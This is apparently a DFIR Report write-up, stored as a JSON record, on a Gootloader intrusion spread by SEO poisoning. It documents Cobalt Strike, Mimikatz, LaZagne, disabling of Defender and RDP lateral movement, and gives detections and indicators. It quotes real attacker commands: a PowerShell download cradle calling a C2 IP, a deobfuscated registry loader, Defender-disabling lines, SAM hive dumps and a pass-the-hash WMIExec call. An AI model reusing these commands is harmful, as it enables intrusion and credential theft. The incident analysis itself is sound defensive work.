{
    "id": "f06d61d3-30b2-4987-97f6-0e5b58a64dc2",
    "created_at": "2023-01-12T14:59:11.035397Z",
    "updated_at": "2025-03-27T02:09:18.033633Z",
    "deleted_at": null,
    "sha1_hash": "24b4242c576f55c076b72b100f51091c15e46d80",
    "title": "2022-05-09 - SEO Poisoning – A Gootloader Story",
    "authors": "",
    "file_creation_date": "2022-06-13T04:01:48Z",
    "file_modification_date": "2022-06-13T04:01:48Z",
    "file_size": 4713171,
    "plain_text": "# SEO Poisoning – A Gootloader Story\n\n**[thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)**\n\nMay 9, 2022\n\nIn early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as\nthe initial access vector.\n\nThe intrusion lasted two days and comprised discovery, persistence, lateral movement,\ncollection, defense evasion, credential access and command and control activity. During the\npost-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec,\nand SharpHound. The threat actors then used this access to review sensitive documents.\n\n## Background\n\n[Gootloader was the name assigned to the multi-staged payload distribution by Sophos in](https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/)\nMarch 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to\nmove compromised websites hosting malware to the top of certain search requests such as\n“what is the difference between a grand agreement and a contract?” or “freddie mac shared\ndriveway agreement?”\n\n\n-----\n\nWhen the user searches for these phrases and clicks on one of the top results, they are left\nwith a forum looking web page where the user is instructed to download a file, which they\naccidently execute (double click to open). You can learn more about Gootloader by reading\nthese references. [1](https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/) [2](https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/) [3](https://redcanary.com/threat-detection-report/threats/gootkit/) [4](https://news.sophos.com/en-us/2021/08/12/gootloaders-mothership-controls-malicious-content/)\n\n[The researcher behind the @GootLoaderSites account is doing a great job of providing](https://twitter.com/GootLoaderSites)\noperational intelligence about the most recent malicious infrastructure. They also contact\nimpacted businesses, monitor for newly created C2 addresses, and make the information\npublic to the community. Thank you!\n\n## Case Summary\n\nThe intrusion started with a user searching Bing for “Olymplus Plea Agreement?”. The user\nthen clicked on the second search result which led to the download and execution of a\nmalicious javascript file (see video in Initial Access section). Upon execution, Gootloader\nutilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the\nhost using a combination of registry keys and scheduled tasks.\n\nFifteen minutes after the initial execution, we observed the threat actors using the\nPowerShell implementation of SharpHound (BloodHound) to discover attack paths in the\nActive Directory-based network. The threat actors collected the results and pivoted to\nanother host via a Cobalt Strike PowerShell beacon.\n\nAfter pivoting, they disabled Windows Defender, before executing a second Cobalt Strike\npayload for a different command and control server. Around an hour after the initial infection,\nthe threat actors ran [LaZagne to retrieve all saved credentials from the pivoted workstation.](https://github.com/AlessandroZ/LaZagne)\n\n\n-----\n\nMeanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract\ncredentials.\n\nWith those credentials, the threat actors used RDP from the beachhead host to the already\ncompromised workstation host. They then targeted several other workstations with Cobalt\nStrike beacon executables; however, no further activity was observed on those endpoints\nother than the initial lateral movement.\n\nThe threat actors favored RDP and remote WMI as their preferred methods to interact with\nthe hosts and servers of interest throughout the rest of the intrusion. After around a four-hour\npause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain\ncontroller and logged in using RDP.\n\nThe threat actors then used Lazagne again on the domain controller to extract more\ncredentials. Our evidence shows that the attackers then began looking for interesting\ndocuments on file shares. They opened the documents one-by-one on the remote host via\nRDP. They directed their focus to documents with legal and insurance-related content.\n\nOn the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from\nthe domain controller via the RDP session. Additionally, they inspected the file server and\nbackup server, looking for more interesting data before leaving the network.\n\n## Services\n\n[We offer multiple services, including a Threat Feed service that tracks Command and Control](https://thedfirreport.com/services/)\nframeworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc.\n[More information on this service and others can be found here.](https://thedfirreport.com/services/)\n\nWe also have artifacts and IOCs available from this case, such as pcaps, memory captures,\nfiles, event logs including Sysmon, Kape packages, and more, under our Security\nResearcher and Organization services.\n\n## Timeline\n\n\n-----\n\n-----\n\n[Analysis and reporting completed by @kostastsale](https://twitter.com/Kostastsale) [@iiamaleks](https://twitter.com/iiamaleks) [@pigerlin](https://twitter.com/pigerlin)\n\n## Initial Access\n\nThe threat actor gained initial access using Gootloader malware. Here’s a video of the user\nsearching and downloading the malware via the poisoned SEO search.\n\n\n-----\n\nWatch Video At:\n\nhttps://youtu.be/IdR-tlv7w48\n\nThe Javascript file is then executed when double clicked after the zip is opened.\n\n## Execution\n\nGootloader upon execution creates two registry keys:\n\n```\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\n\n```\n```\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n\n```\n\nThe first is populated with an encoded Cobalt Strike payload and the latter is used to store a\n.NET loader named powershell.dll.\n\n\n-----\n\nFollowing the Registry events, a PowerShell command was launched executing an encoded\ncommand.\n```\n\"powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/\"e\"\nNgAxA\"DQANgA0ADkA\"MgAxADEAOwB\"zAGwAZQBlAHAAIAAtAHMAIAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"QA\n\n```\nThe PowerShell command will extract the .NET loader from\n```\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0 and execute the code in memory via\n\n```\n`Assembly.Load()`.\n```\n614649211; sleep -s 83; $opj=Get-ItemProperty -path\n(\"hkcu:\\software\\microsoft\\Phone\\\"+[Environment]::(\"username\")+\"0\"); for ($uo=0;$uo le 760;$uo++) { Try{$mpd+=$opj.$uo}Catch{} }; $uo=0; while($true) { $uo++;$ko=\n[math]::(\"sqrt\")($uo); if($ko -eq 1000){break} } $yl=$mpd.replace(\"#\",$ko); $kjb=\n[byte[]]::(\"new\")($yl.Length/2); for($uo=0;$uo -lt $yl.Length;$uo+=2){ $kjb[$uo/2]=\n[convert]::(\"ToByte\")($yl.Substring($uo,2),(2*8)) } [reflection.assembly]::(\"Load\")\n($kjb); [Open]::(\"Test\")(); 6118985\n\n```\n[This CyberChef recipe can be used to decode the related PS encoded payload.](https://github.com/The-DFIR-Report/cyberchef-recipes/blob/main/SEO%20Poisoning%20-%20A%20GootLoader%20Story)\nOnce the PowerShell script is finished running, the next stage involves the .NET loader. The\n.NET loader will read `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username and extract the`\nencoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into\nmemory for execution.\nA simple encoding scheme is used where a letter will correspond to one of the hex\ncharacters (0-F), or alternately three zeros.\n\n\n-----\n\n```\nq >000\nv->0\nw->1\nr->2\nt->3\ny->4\nu->5\ni->6\no->7\np->8\ns->9\nq->A\nh->B\nj->C\nk->D\nl->E\nz->F\n\n```\nThe following shows the source code responsible for the core logic of the .NET loader.\n\nThe below diagram summarizes the Gootloader initial execution.\n\n\n-----\n\nAn [excellent resource from Microsoft describes a set of configurations that can be applied to](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-javascript-or-vbscript-from-launching-downloaded-executable-content)\nWindows that can stop `.js files from executing, preventing this attack chain from ever`\ngetting off the ground.\nDuring later stages of the intrusion, Cobalt Strike was executed interactively through RDP on\nmultiple systems.\n```\npowershell.exe -nop -w hidden -c \"IEX ((new-object\nnet.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))\"\n\n## Persistence\n\n```\nThe Javascript (Gootloader) file invoked an encoded PowerShell command.\n\nThe encoded PowerShell command creates a Scheduled Task that executes when the\nselected user logs on to the computer. An encoded PowerShell command is executed that\nwill retrieve and execute the payload stored in the Registry.\n\n\n-----\n\n```\n6876813;\n$a=\"NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQALQ\n$u=$env:USERNAME;\nRegister-ScheduledTask $u -In (New-ScheduledTask -Ac (New-ScheduledTaskAction -E\n([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) -Ar (\"-w h -e \"+$a))\n-Tr (New-ScheduledTaskTrigger -AtL -U $u));\n30687851\n\n```\n**Decoded PowerShell Payload:**\n```\n6876813;\n614649211;\n$a = \"614649211\";\nsleep - s 83;\n$opj = Get - ItemProperty - path(\"hkcu:\\software\\microsoft\\Phone\\\"\"+[Environment]::(\"\nusername \")+\" 0 \");\n for ($uo = 0; $uo - le 760; $uo ++) {\n Try {\n  $mpd += $opj.$uo\n }\n Catch {}\n};\n$uo = 0;\nwhile ($true) {\n $uo ++;\n $ko = [math]::(\"sqrt\")($uo);\n if ($ko - eq 1000) {\n  break\n }\n}\n$yl = $mpd.replace(\"#\", $ko);\n$kjb = [byte[]]::(\"new\")($yl.Length / 2);\nfor ($uo = 0; $uo - lt $yl.Length; $uo += 2) {\n $kjb[$uo / 2] = [convert]::(\"ToByte\")($yl.Substring($uo, 2), (2 * 8))\n}[reflection.assembly]::(\"Load\")($kjb);\n[Open]::(\"Test\")();\n611898544;\n$u = $env : USERNAME;\nRegister - ScheduledTask $u - In(New - ScheduledTask - Ac(New - ScheduledTaskAction E([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) - Ar(\"-w h -e \" +\n$a)) - Tr(New - ScheduledTaskTrigger - AtL - U $u));\n306878516;\n\n```\nThe task created from the PowerShell script:\n\n\n-----\n\n## Defense Evasion\n\nWindows Defender scheduled scans were deleted from the system. This was observed on\nmultiple servers the threat actor pivoted to.\n\n\n-----\n\n```\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled\nScan\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache\nMaintenance\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\"\n/f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender\nVerification\" /f\n\n```\nFurthermore, PowerShell was used to disable multiple security features built into Microsoft\nDefender.\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableArchiveScanning $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nSet-MpPreference -DisableIntrusionPreventionSystem $true\nSet-MpPreference -DisableScanningNetworkFiles $true\nSet-MpPreference -MAPSReporting 0\nSet-MpPreference -DisableCatchupFullScan $True\nSet-MpPreference -DisableCatchupQuickScan $True\n\n```\nAs in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt\nStrike beacons into memory on the beachhead host.\n\n\n-----\n\nThis can be observed in the memory dump from the beachhead host with the tell-tale\n```\nPAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers\n\n```\nobservable in the process memory space.\n\n\n-----\n\nDuring the intrusion we observed various named pipes utilized by the threat actor’s Cobalt\nStrike beacons including default Cobalt Strike named pipes.\n\n\n-----\n\n```\nPipeName: \\msagent_ld\nPipeName: \\1ea887\n\n```\nThe threat actors were observed making use of double encoded Powershell commands. The\nfirst layer of encoding contains Hexadecimal and XOR encoding.\n\nThe second layer of encoding contains a Base64 encoded string resulting in Gunzipped\ndata.\n\n\n-----\n\n[Decoding this script reveals that it is a publicly available WMIExec script for running remote](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1)\nWMI queries.\n\n## Credential Access\n\nThe malicious PowerShell process used by Gootloader dropped a PowerShell script named\n“mi.ps1” on the file system.\n\nAnother PowerShell command was used to trigger the mi.ps1 script. The script was using\nXOR-encoding.\n```\npowershell -nop -noni -ep bypass -w h -c \"\"$t=([type]'Convert');&\n([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name)\n('NWYsOV90Zjxec3t0cmUxX3RlP0Z0c1J9eHR/ZTgqNWQsNWY/OTk5OTVmOD9BYl5ze3RyZT9cdGV5fnViOG0u\n{$ bxor17}|%{[char]$ }) join''))\"\"\n\n```\n\n-----\n\n[This CyberChef recipe can be used to decode the inner encoded command.](https://github.com/The-DFIR-Report/cyberchef-recipes/blob/main/SEO%20Poisoning%20-%20A%20GootLoader%20Story)\nThe output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1\nscript used to load Mimikatz DLL directly in memory.\n```\n$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\\Users\\\n<redacted>\\mi.ps1; Invoke-Mimikatz -ComputerName <redacted>\n\n```\nMonitoring PowerShell event id 4103 we can observe the threat actor’s successful credential\naccess activity from the Mimikatz invocation.\n\n[In addition, the post-exploitation tool “LaZagne” (renamed to ls.exe) was used with the “-all”](https://github.com/AlessandroZ/LaZagne)\nswitch.\n```\nls.exe all -oN -output C:\\Users\\REDACTED\n\n```\nThis will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP,\nRDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the “C:\\Users”\ndirectory. When LaZagne is run with admin privileges, it also attempts to dump credentials\nfrom local registry hives, as can be seen below.\n\n\n-----\n\nHere’s the commands from another system:\n```\ncmd.exe /c \"reg.exe save hklm\\sam c:\\users\\REDACTED\\appdata\\local\\temp\\1\\dznuxujzr\"\ncmd.exe /c \"reg.exe save hklm\\system c:\\users\\REDACTED\\appdata\\local\\temp\\1\\mkffdg\"\ncmd.exe /c \"reg.exe save hklm\\security\nc:\\users\\REDACTED\\appdata\\local\\temp\\1\\iszmqwmjemt\"\n\n## Discovery\n\n```\nThe threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the\nbeachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was\nused to invoke the PowerShell script.\n```\npowershell -nop -exec bypass -EncodedCommand\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG\n\n```\nThey also ran a WMI command on the beachhead host and one other host to check for\nAntiVirus.\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get\ndisplayName /Format:List\n\n```\nThe threat actors executed this command remotely on a domain controller, before moving\nlaterally to it:\n```\npowershell.exe ls C:\\ > C:\\file.txt\n\n```\nWhile having an interactive RDP session, in an attempt to collect more information regarding\nthe host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted\nto.\nOn the last day, and before they left the network, threat actors used Advanced IP Scanner to\nscan the whole network for the below open ports:\n```\n21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502\n\n```\n\n-----\n\n## Lateral Movement\n\nAs observed in many of our intrusions, the threat actor created and installed Windows\nservices to deploy Cobalt Strike beacons. This method was used to pivot to other systems\nwithin the network.\n\n\n-----\n\nSMB was also used to transfer executable Cobalt Strike beacons to various workstations in\nthe environment.\n\nThese executables were then executed by a remote service visible in the windows event id\n7045 logs.\n\nNext to deploying Cobalt Strike beacons, the threat actor also used RDP to establish\ninteractive sessions with various hosts on the network. One important aspect of these\nsessions is that the threat actor authenticated using “Restricted Admin Mode”.\n\n\n-----\n\nRestricted Admin Mode can be considered a double-edged sword; although it prevents\ncredential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In\nother words, after enabling Restricted Admin Mode, just the NTLM hash of the remote\ndesktop user is required to establish a valid RDP session, without the need of possessing\nthe clear password.\nThe threat actor attempted to use both Invoke-WMIExec and psexec to enable “Restricted\nAdmin Mode”.\n```\npsexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add\n\"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD\n/d 0\npowershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:47961/'|%%{(IRM\n$_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\\n<redacted>\\Invoke-WMIExec.ps1; Invoke-WMIExec -Target <redacted> -Domain <redacted> Username <redacted> -Hash <redacted> -Command \"powershell.exe New-ItemProperty -Path\n'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DisableRestrictedAdmin' -Value 0\n-PropertyType DWORD\" -verbose\"\n\n```\nThe logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set\nto the value “Yes” if the feature is used.\n\n\n-----\n\n-----\n\n## Collection\n\nThe threat actor accessed multiple files during the RDP sessions on multiple servers. In one\ninstance document files were opened directly on the system.\n\nShellbags reveled attempts to enumerate multiple file shares containing information of\ninterest to the threat actor.\n\n## Command and Control\n\n### Gootloader\n\nGootloader second stage download URLs. These URLs were deobfuscated and extracted\nusing [this script by](https://github.com/hpthreatresearch/tools/blob/main/gootloader/decode.py) [HP Threat Research. They’ve updated this script at least a few times](https://twitter.com/HPSecurity)\nnow, thanks [@hpsecurity and thanks to](https://twitter.com/HPSecurity) [@GootLoaderSites for sharing on twitter as its](https://twitter.com/GootLoaderSites)\nbroken/fixed.\n```\nhxxps://kakiosk.adsparkdev[.]com/test.php?hjkiofilihyl=\nhxxps://jp.imonitorsoft[.]com/test.php?hjkiofilihyl=\nhxxps://junk-bros[.]com/test.php?hjkiofilihyl=\n\n```\nDuring the intrusion the Gootloader loader was observed communicating to\n35.206.117.64:443 kakiosk[.]adsparkdev[.]com.\n\n\n-----\n\n```\nJa3:a0e9f5d64349fb13191bc781f81f42e1\nJa3s:567bb420d39046dbfd1f68b558d86382\nCertificate: [d8:85:d1:48:a2:99:f5:ee:9d:a4:3e:01:1c:b0:ec:12:e5:23:7d:61 ]\nNot Before: 2022/01/05 09:25:33 UTC \nNot After: 2022/04/05 09:25:32 UTC \nIssuer Org: Let's Encrypt \nSubject Common: kakiosk.adsparkdev.com [kakiosk.adsparkdev.com\n,www.kakiosk.adsparkdev.com ]\nPublic Algorithm: rsaEncryption\n\n### Cobalt Strike\n\n```\n**146.70.78.43**\nCobalt Strike server TLS configuration:\n```\n146.70.78.43\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After: May 17 18:26:24 2025 GMT\nIssuer: C=, ST=, L=, O=, OU=, CN=\nSubject: C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n\n```\nCobalt Strike beacon configuration:\n\n\n-----\n\n```\nCobalt Strike Beacon:\n x86:\n  beacon_type: HTTPS\n  dns-beacon.strategy_fail_seconds: -1\n  dns-beacon.strategy_fail_x: -1\n  dns-beacon.strategy_rotate_seconds: -1\n  http-get.client:\n   Cookie\n  http-get.uri: 146.70.78.43,/visit.js\n  http-get.verb: GET\n  http-post.client:\n   Content-Type: application/octet-stream\n   id\n  http-post.uri: /submit.php\n  http-post.verb: POST\n  maxgetsize: 1048576\n  port: 443\n  post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n  post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n  process-inject.execute:\n   CreateThread\n   SetThreadContext\n   CreateRemoteThread\n   RtlCreateUserThread\n  process-inject.startrwx: 64\n  process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n  process-inject.userwx: 64\n  proxy.behavior: 2 (Use IE settings)\n  server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n  sleeptime: 60000\n  useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;\nTrident/5.0; yie9)\n  uses_cookies: 1\n  watermark: 1580103824\n x64:\n  beacon_type: HTTPS\n  dns-beacon.strategy_fail_seconds: -1\n  dns-beacon.strategy_fail_x: -1\n  dns-beacon.strategy_rotate_seconds: -1\n  http-get.client:\n   Cookie\n  http-get.uri: 146.70.78.43,/fwlink\n  http-get.verb: GET\n  http-post.client:\n   Content-Type: application/octet-stream\n   id\n  http-post.uri: /submit.php\n  http-post.verb: POST\n  maxgetsize: 1048576\n  port: 443\n  post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n  post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n  process-inject.execute:\n   CreateThread\n   SetThreadContext\n\n```\n\n-----\n\n```\n   CreateRemoteThread\n   RtlCreateUserThread\n  process-inject.startrwx: 64\n  process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n  process-inject.userwx: 64\n  proxy.behavior: 2 (Use IE settings)\n  server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n  sleeptime: 60000\n  useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\nBOIE9;ENXA)\n  uses_cookies: 1\n  watermark: 1580103824\n\n```\n**37.120.198.225**\nCobalt Strike server TLS configuration:\n```\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After : May 17 18:26:24 2025 GMT\nIssuer: C=, ST=, L=, O=, OU=, CN=\nSubject: C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n\n```\nCobalt Strike beacon configuration:\n\n\n-----\n\n```\nCobalt Strike Beacon:\n x86:\n  beacon_type: HTTPS\n  dns-beacon.strategy_fail_seconds: -1\n  dns-beacon.strategy_fail_x: -1\n  dns-beacon.strategy_rotate_seconds: -1\n  http-get.client:\n   Cookie\n  http-get.uri: 37.120.198.225,/cm\n  http-get.verb: GET\n  http-post.client:\n   Content-Type: application/octet-stream\n   id\n  http-post.uri: /submit.php\n  http-post.verb: POST\n  maxgetsize: 1048576\n  port: 443\n  post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n  post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n  process-inject.execute:\n   CreateThread\n   SetThreadContext\n   CreateRemoteThread\n   RtlCreateUserThread\n  process-inject.startrwx: 64\n  process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n  process-inject.userwx: 64\n  proxy.behavior: 2 (Use IE settings)\n  server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n  sleeptime: 60000\n  useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\nBOIE9;ENUSMSE)\n  uses_cookies: 1\n  watermark: 1580103824\n x64:\n  beacon_type: HTTPS\n  dns-beacon.strategy_fail_seconds: -1\n  dns-beacon.strategy_fail_x: -1\n  dns-beacon.strategy_rotate_seconds: -1\n  http-get.client:\n   Cookie\n  http-get.uri: 37.120.198.225,/ptj\n  http-get.verb: GET\n  http-post.client:\n   Content-Type: application/octet-stream\n   id\n  http-post.uri: /submit.php\n  http-post.verb: POST\n  maxgetsize: 1048576\n  port: 443\n  post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n  post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n  process-inject.execute:\n   CreateThread\n   SetThreadContext\n\n```\n\n-----\n\n```\n   CreateRemoteThread\n   RtlCreateUserThread\n  process-inject.startrwx: 64\n  process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n  process-inject.userwx: 64\n  proxy.behavior: 2 (Use IE settings)\n  server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n  sleeptime: 60000\n  useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\nFunWebProducts; IE0006_ver1;EN_GB)\n  uses_cookies: 1\n  watermark: 1580103824\n\n```\n[Real Intelligence Threat Analytics (RITA) was successful in locating one of the IP addresses](https://github.com/activecm/rita)\nused for Cobalt Strike command and control communications.\n\nNetscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2\nconnections:\n```\nVolatility 3 Framework 2.0.0\nOffset Proto  LocalAddr    LocalPort    ForeignAddr   ForeignPort   State\nPID   Owner  Created\n...\n0x948431c46010 TCPv4  10.X.X.X  52670  146.70.78.43  443   CLOSE_WAIT   \n3420  rundll32.exe  \n0x948431e19010 TCPv4  10.X.X.X  63723  146.70.78.43  443   CLOSED 3420  \nrundll32.exe   \n0x9484337f18a0 TCPv4  10.X.X.X  52697  146.70.78.43  443   CLOSE_WAIT   \n3420  rundll32.exe   \n0x948435102050 TCPv4  10.X.X.X  52689  146.70.78.43  443   CLOSE_WAIT   \n3420  rundll32.exe \n...\n\n## Impact\n\n```\nIn this case, there was no further impact to the environment before the threat actors were\nevicted.\n\n### Indicators\n\n Network\n\n\n-----\n\n```\nGootloader\nhttps://kakiosk.adsparkdev[.]com\nhttps://jp.imonitorsoft[.]com\nhttps://junk-bros[.]com\n35.206.117.64:443\nCobalt Strike\n146.70.78.43:443\n37.120.198.225:443\n\n### File\nolympus_plea_agreement 34603 .js\nd7d3e1c76d5e2fa9f7253c8ababd6349\n724013ea6906a3122698fd125f55546eac0c1fe0\n6e141779a4695a637682d64f7bc09973bb82cd24211b2020c8c1648cdb41001b\nolympus plea agreement(46196).zip\nb50333ff4e5cbcda8b88ce109e882eeb\n44589fc2a4d1379bee93282bbdb16acbaf762a45\n7d93b3531f5ab7ef8d68fb3d06f57e889143654de4ba661e5975dae9679bbb2c\nmi.ps1\nacef25c1f6a7da349e62b365c05ae60c\nc5d134a96ca4d33e96fb0ab68cf3139a95cf8071\nd00edf5b9a9a23d3f891afd51260b3356214655a73e1a361701cda161798ea0b\nInvoke-WMIExec.ps1\nb4626a335789e457ea48e56dfbf39710\n62a7656d81789591358796100390799e83428519\nc4939f6ad41d4f83b427db797aaca106b865b6356b1db3b7c63b995085457222\nls.exe\n87ae2a50ba94f45da39ec7673d71547c\ndfa0b4206abede8f441fcdc8155803b8967e035c\n8764131983eac23033c460833de5e439a4c475ad94cfd561d80cb62f86ff50a4\n\n## Detections\n\n### Network\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike \nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\n\n Sigma\n\n```\nCustom Sigma rules\n\n[Deleting Windows Defender scheduled tasks](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Deleting%20Windows%20Defender%20scheduled%20tasks)\n\n\n-----\n\n[Enabling restricted admin mode](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Enabling%20restricted%20admin%20mode)\n\n[Using powershell specific download cradle OneLiner](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Using%20powershell%20specific%20download%20cradle%20OneLiner)\n\n[Using Lazagne to dump credentials](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Using%20Lazagne%20to%20dump%20credentials)\n\nSigma repo rules\n\nBloodhound Detection –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_hack_bloodhound.yml\nPowershell download –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_powershell_download_patterns.yml\nDefender Disable via Powershell –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_powershell_defender_disable_feature.yml\nCreation of Scheduled Task via Powershell –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/\nposh_ps_cmdlet_scheduled_task.yml\nLaZagne LSASS Access –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access\n_win_lazagne_cred_dump_lsass_access.yml\nSysteminfo Discovery –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_systeminfo.yml\nCobaltStrike Named Pipe –\nhttps://github.com/SigmaHQ/sigma/blob/7fb8272f948cc0b528fe7bd36df36449f74b2266/rules\n/windows/pipe_created/pipe_created_mal_cobaltstrike.yml\nMalicious PowerShell Commandlets –\nhttps://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/\nwindows/powershell/powershell_script/posh_ps_malicious_commandlets.yml\nSuspicious Service Installation –\nhttps://github.com/SigmaHQ/sigma/blob/7d48d0e838b76f3fb5bc623e7ec45343cfac9c88/rule\ns/windows/builtin/system/win_susp_service_installation.yml\nSuspicious XOR Encoded PowerShell Command Line –\nhttps://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/\nwindows/powershell/powershell_classic/posh_pc_xor_commandline.yml\nToo Long PowerShell Commandlines –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_long_powershell_commandline.yml\nPowerShell Network Connections –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_conn\nection win powershell network connection yml\n\n\n-----\n\nRundll32 Internet Connection –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_conn\nection_win_rundll32_net_connections.yml\nMimikatz Use –\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_alert_mimikatz_ke\nywords.yml\n\n### Yara\n\n[Custom Yara rule](https://github.com/The-DFIR-Report/Yara-Rules/blob/main/SEO%20Poisoning%20%E2%80%93%20A%20Gootloader%20Story)\n\n## MITRE\n\nT1189 Drive-by Compromise\nT1204.001 – User Execution: Malicious Link\nT1204.002 – User Execution: Malicious File\nT1059.001 – Command and Scripting Interpreter: 